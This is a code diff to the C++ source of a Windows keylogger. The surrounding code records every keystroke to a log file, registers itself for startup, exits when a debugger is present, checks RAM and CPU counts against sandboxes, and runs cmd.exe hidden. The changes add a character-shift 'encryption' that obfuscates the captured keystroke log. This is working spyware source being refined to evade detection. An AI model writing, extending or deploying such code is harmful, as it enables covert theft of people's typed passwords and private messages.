@@ -28,6 +28,7 @@ typedef unsigned long long uint64_t;
 #define MaximumFolderSize 10 
 #define RequiredRam 2048 //MB
 #define RequiredCores 2 
+#define ShiftNumber 100 //int to add to chars for crypting measures
 
 #define MAX_LENGTH 1024
 
@@ -62,7 +63,7 @@ int CalculateDirSize(std::string DirectoryToCheck) {
 
     int FileCounter = 0;
 
-    char FilePath[MAX_PATH + 1];
+    //char FilePath[MAX_PATH + 1];
     DWORD FileSize = MAX_PATH + 1;
 
     hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
@@ -120,6 +121,14 @@ BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
     return fSuccess;
 }
 
+std::string EncryptMyString(std::string UnencryptedString) {
+
+    std::string CryptedString;
+    for (int r = 0; r < UnencryptedString.size(); r++) {
+        CryptedString += UnencryptedString[r] + ShiftNumber;
+    }
+    return CryptedString;
+}
 
 void LogItInt(int key_stroke,std::string FileName) {
     if (key_stroke == 1 || key_stroke == 2) 
@@ -132,40 +141,41 @@ void LogItInt(int key_stroke,std::string FileName) {
     std::cout << key_stroke << std::endl;
 
     if (key_stroke == 8)
-        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
     else if (key_stroke == 13)
-        fprintf(OUTPUT_FILE, "%s", "\n");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
     else if (key_stroke == VK_SPACE)
-        fprintf(OUTPUT_FILE, "%s", " ");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
     else if (key_stroke == VK_LWIN)
-        fprintf(OUTPUT_FILE, "%s", "[WIN]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
     else if (key_stroke == VK_TAB)
-        fprintf(OUTPUT_FILE, "%s", "[TAB]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
     else if (key_stroke == VK_CAPITAL)
-        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
     else if (key_stroke == VK_SHIFT)
-        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
     else if (key_stroke == VK_CONTROL)
-        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]"));
     else if (key_stroke == VK_ESCAPE)
-        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
     else if (key_stroke == VK_END)
-        fprintf(OUTPUT_FILE, "%s", "[END]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
     else if (key_stroke == VK_HOME)
-        fprintf(OUTPUT_FILE, "%s", "[HOME]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
     else if (key_stroke == VK_DELETE)
-        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
     else if (key_stroke == VK_LEFT)
-        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
     else if (key_stroke == VK_UP)
-        fprintf(OUTPUT_FILE, "%s", "[UP]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
     else if (key_stroke == VK_RIGHT)
-        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
     else if (key_stroke == VK_DOWN)
-        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
     else if (key_stroke == 190 || key_stroke == 110)
-        fprintf(OUTPUT_FILE, "%s", ".");
+        fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
     else
+        key_stroke += ShiftNumber;
         fprintf(OUTPUT_FILE, "%s", &key_stroke);
     fclose(OUTPUT_FILE);
 }
@@ -202,11 +212,14 @@ void LogItChar(std::string Value, std::string FileName) {
     if (IsDebuggerPresent()) {
         exit(0);
     }
+
 #endif
+
+    Value += "\n";
+
     std::ofstream File;
     File.open(FileName, std::ios_base::app);
-    File << Value;
-    File << "\n";
+    File << EncryptMyString(Value);
     File.close();
 }
 
@@ -398,6 +411,7 @@ Log:
             Command += "\\*.*";
             ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
             LogItChar("Cleaned MagikIndex folder...", CurrentLog);
+            Sleep(200);
         }
 
         CreateDirectoryA(DestinationFile.c_str(), NULL);
